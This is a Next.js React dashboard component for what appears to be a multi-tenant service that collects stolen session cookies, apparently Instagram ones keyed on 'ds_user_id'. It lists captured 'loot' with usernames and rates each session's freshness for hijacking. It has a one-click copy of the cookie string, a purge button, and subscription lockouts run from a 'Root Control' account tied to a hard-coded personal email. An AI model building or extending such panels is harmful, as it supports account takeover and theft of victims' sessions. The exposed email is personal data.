"use client";
import { useEffect, useState, useCallback, useMemo } from "react";
import { createBrowserClient } from "@supabase/ssr";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import { PurgeButton } from "@/components/PurgeButton";
import {
  LogOut,
  Activity,
  Search,
  Lock,
  Radio,
  XCircle,
  Clock,
  ShieldAlert,
} from "lucide-react";
import {
  getRemoteLoot,
  logout,
  purgeRemoteLoot,
  getNodeStatus,
  getGlobalBroadcast, // Ensure this is exported in actions.ts
} from "./actions";
import Link from "next/link";

const getIdentityColor = (uid: string) => {
  const colors = [
    "text-[#00ff41] bg-[#00ff41]/10 border-[#00ff41]/20",
    "text-emerald-400 bg-emerald-400/10 border-emerald-400/20",
    "text-white bg-white/10 border-white/20",
    "text-cyan-400 bg-cyan-400/10 border-cyan-400/20",
  ];
  let hash = 0;
  for (let i = 0; i < uid.length; i++) {
    hash = uid.charCodeAt(i) + ((hash << 5) - hash);
  }
  return colors[Math.abs(hash) % colors.length];
};

export default function AdminDashboard() {
  const [loot, setLoot] = useState<any[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [broadcast, setBroadcast] = useState<{
    message: string;
    type: string;
  } | null>(null);
  const [profile, setProfile] = useState<{
    id: string;
    email: string;
    tenant_id: string;
    is_locked: boolean;
    system_message: string | null;
    message_type: string | null;
  } | null>(null);

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  const getSessionHealth = useCallback((timestamp: string) => {
    const captureDate = new Date(timestamp).getTime();
    const now = new Date().getTime();
    const hoursOld = (now - captureDate) / (1000 * 60 * 60);

    if (hoursOld > 24)
      return { label: "EXPIRED", color: "text-zinc-800", alert: false };
    if (hoursOld > 20)
      return {
        label: "CRITICAL",
        color: "text-red-600 animate-pulse",
        alert: true,
      };
    if (hoursOld > 12)
      return { label: "STALE", color: "text-amber-500", alert: false };
    return { label: "FRESH", color: "text-[#00ff41]", alert: false };
  }, []);

  const stats = useMemo(() => {
    const uniqueIds = new Set(
      loot
        .map(
          (item) =>
            item.data
              .find((s: string) => s.includes("ds_user_id"))
              ?.split("=")[1],
        )
        .filter(Boolean),
    );
    const expiring = loot.filter(
      (item) => getSessionHealth(item.timestamp).alert,
    ).length;
    return { total: loot.length, unique: uniqueIds.size, expiring };
  }, [loot, getSessionHealth]);

  const updateHeartbeat = useCallback(
    async (userId: string) => {
      await supabase
        .from("profiles")
        .update({ last_active: new Date().toISOString() })
        .eq("id", userId);
    },
    [supabase],
  );

  const fetchData = useCallback(async () => {
    try {
      const [
        status,
        broadcastData,
        {
          data: { user },
        },
      ] = await Promise.all([
        getNodeStatus(),
        getGlobalBroadcast(),
        supabase.auth.getUser(),
      ]);

      if (status) {
        setProfile((prev) => ({
          ...prev,
          id: user?.id || prev?.id || "",
          email: user?.email || prev?.email || "",
          is_locked: status.is_locked,
          system_message: status.system_message,
          message_type: status.message_type,
          tenant_id: status.tenant_id,
        }));

        setBroadcast(broadcastData);

        if (status.is_locked) {
          setLoot([]);
          return;
        }
      }

      const lootData = await getRemoteLoot();
      if (Array.isArray(lootData)) {
        setLoot([...lootData].reverse());
      }

      if (user?.id) {
        updateHeartbeat(user.id);
      }
    } catch (err) {
      console.error("Sync_Error:", err);
    }
  }, [supabase, updateHeartbeat]);

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000);
    return () => clearInterval(interval);
  }, [fetchData]);

  const filteredLoot = useMemo(() => {
    return loot.filter((item) => {
      const searchStr = searchTerm.toLowerCase();
      const uid = item.data.find((s: string) => s.includes("ds_user_id")) || "";
      const username = item.username || "";
      return (
        uid.toLowerCase().includes(searchStr) ||
        username.toLowerCase().includes(searchStr)
      );
    });
  }, [loot, searchTerm]);

  return (
    <div className="min-h-screen bg-[#050505] text-[#00ff41]/60 font-mono p-4 md:p-12 relative overflow-x-hidden selection:bg-[#00ff41] selection:text-black">
      <AnimatePresence>
        {profile?.is_locked && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] bg-black/95 backdrop-blur-xl flex items-center justify-center p-6">
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              className="max-w-md w-full border border-red-900 bg-black p-8 text-center space-y-6 shadow-[0_0_50px_rgba(153,27,27,0.2)]">
              <div className="flex justify-center">
                <div className="p-4 bg-red-900/20 rounded-full border border-red-900/40">
                  <Lock className="text-red-500 animate-pulse" size={40} />
                </div>
              </div>
              <div className="space-y-2">
                <h2 className="header-font text-white text-xl font-black uppercase italic tracking-tighter">
                  Node_Access_Suspended
                </h2>
                <p className="text-[10px] text-zinc-500 leading-relaxed uppercase tracking-widest">
                  Your credentials have been flagged or subscription has
                  expired. Contact Root Control.
                </p>
              </div>

              {profile.system_message && (
                <div className="bg-red-900/10 border border-red-900/30 p-4">
                  <p className="text-[#00ff41] text-[10px] font-bold hacker-font italic leading-relaxed">
                    "{profile.system_message}"
                  </p>
                </div>
              )}

              <button
                onClick={() => logout()}
                className="w-full py-4 bg-white text-black text-[10px] font-black uppercase header-font hover:bg-red-600 hover:text-white transition-all">
                Disconnect_Node
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <header className="relative z-10 flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-12 max-w-6xl mx-auto border-b border-[#00ff41]/10 pb-8">
        <div>
          <div className="flex items-center gap-6">
            <h1 className="header-font text-white text-2xl font-bold tracking-tighter uppercase italic">
              VENUS<span className="text-[#00ff41]">TREE</span>
            </h1>
            <div className="flex gap-2">
              <div className="px-2 py-1 bg-[#00ff41]/5 border border-[#00ff41]/20 rounded-sm text-[9px] text-[#00ff41] font-bold uppercase tabular-nums">
                <Activity size={10} className="inline mr-1" /> {stats.total}{" "}
                PKTS
              </div>
              <div className="px-2 py-1 bg-[#00ff41]/10 border border-[#00ff41]/30 rounded-sm text-[9px] text-[#00ff41] font-black uppercase flex items-center gap-2">
                <span className="w-1 h-1 rounded-full bg-[#00ff41] animate-pulse" />{" "}
                Uplink_Live
              </div>
            </div>
          </div>
          <p className="text-[9px] uppercase tracking-[0.4em] text-zinc-600 mt-3 font-bold">
            Node_Identity:{" "}
            <span className="text-white">
              {profile?.tenant_id && profile.tenant_id !== "PENDING"
                ? profile.tenant_id
                : "SECURE_BOOT..."}
            </span>
          </p>
        </div>

        <div className="flex flex-wrap items-center gap-3">
          {profile?.email === "wchloe7964@gmail.com" && (
            <Link
              href="/admin/super"
              className="px-4 py-2 bg-[#00ff41]/5 border border-[#00ff41]/20 text-[#00ff41] text-[10px] font-bold hover:bg-[#00ff41]/10 transition-all uppercase header-font">
              Root_Control
            </Link>
          )}
          <PurgeButton
            onPurge={async () => {
              await purgeRemoteLoot();
              setLoot([]);
            }}
          />
          <button
            onClick={() => logout()}
            className="px-4 py-2 bg-black border border-zinc-900 text-zinc-500 text-[10px] uppercase font-bold hover:text-red-500 transition-all">
            Disconnect
          </button>
        </div>
      </header>

      <main className="relative z-10 max-w-6xl mx-auto space-y-6">
        {/* --- GLOBAL NETWORK BROADCAST --- */}
        {broadcast?.message && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-cyan-500/10 border border-cyan-500/20 p-4 flex items-center gap-4">
            <ShieldAlert size={16} className="text-cyan-400 animate-pulse" />
            <div className="flex-1">
              <span className="text-[9px] text-cyan-400 font-black uppercase tracking-widest block mb-1">
                Global_Network_Notice:
              </span>
              <p className="text-white text-[11px] italic font-bold">
                "{broadcast.message}"
              </p>
            </div>
          </motion.div>
        )}

        {/* --- TARGETED SYSTEM SIGNAL --- */}
        {profile?.system_message && !profile.is_locked && (
          <motion.div
            initial={{ y: -20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            className="bg-[#00ff41]/10 border border-[#00ff41]/20 p-4 flex items-center gap-4">
            <div className="flex-shrink-0">
              <Radio size={16} className="text-[#00ff41] animate-pulse" />
            </div>
            <div className="flex-1">
              <span className="text-[10px] text-[#00ff41] font-black uppercase tracking-widest block mb-1">
                Incoming_Signal:
              </span>
              <p className="text-white text-[11px] hacker-font italic font-bold">
                "{profile.system_message}"
              </p>
            </div>
          </motion.div>
        )}

        <div className="relative">
          <Search
            className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-800"
            size={14}
          />
          <input
            type="text"
            placeholder="FILTER_DATA_STREAM..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="w-full bg-black border border-zinc-900 p-4 pl-12 text-[10px] text-[#00ff41] focus:outline-none focus:border-[#00ff41]/40 uppercase hacker-font"
          />
        </div>

        <div className="border border-[#00ff41]/10 bg-black/40 backdrop-blur-md overflow-x-auto">
          <table className="w-full text-left text-xs min-w-[700px] hacker-font">
            <thead className="border-b border-[#00ff41]/10 bg-[#00ff41]/5 text-zinc-500 uppercase text-[9px]">
              <tr>
                <th className="px-6 py-4">Timestamp</th>
                <th className="px-6 py-4">Identity</th>
                <th className="px-6 py-4">Integrity</th>
                <th className="px-6 py-4 text-right">Data_Object</th>
              </tr>
            </thead>
            <tbody>
              <AnimatePresence mode="popLayout">
                {filteredLoot.map((item, i) => {
                  const uid =
                    item.data
                      .find((s: string) => s.includes("ds_user_id"))
                      ?.split("=")[1] || "null";
                  const health = getSessionHealth(item.timestamp);
                  return (
                    <motion.tr
                      key={i}
                      layout
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      className={`border-b border-[#00ff41]/5 group hover:bg-[#00ff41]/5 ${health.label === "EXPIRED" ? "opacity-20" : ""}`}>
                      <td className="px-6 py-4 tabular-nums text-zinc-500">
                        {item.timestamp}
                      </td>
                      <td className="px-6 py-4">
                        <span
                          className={`px-2 py-1 rounded-sm border text-[9px] font-bold ${getIdentityColor(uid)}`}>
                          {item.username ? `@${item.username}` : `ID:${uid}`}
                        </span>
                      </td>
                      <td className="px-6 py-4">
                        <span
                          className={`text-[9px] font-bold uppercase ${health.color}`}>
                          {health.label}
                        </span>
                      </td>
                      <td className="px-6 py-4 text-right">
                        <CopyButton data={item.data.join("; ")} />
                      </td>
                    </motion.tr>
                  );
                })}
              </AnimatePresence>
            </tbody>
          </table>
        </div>
      </main>
    </div>
  );
}
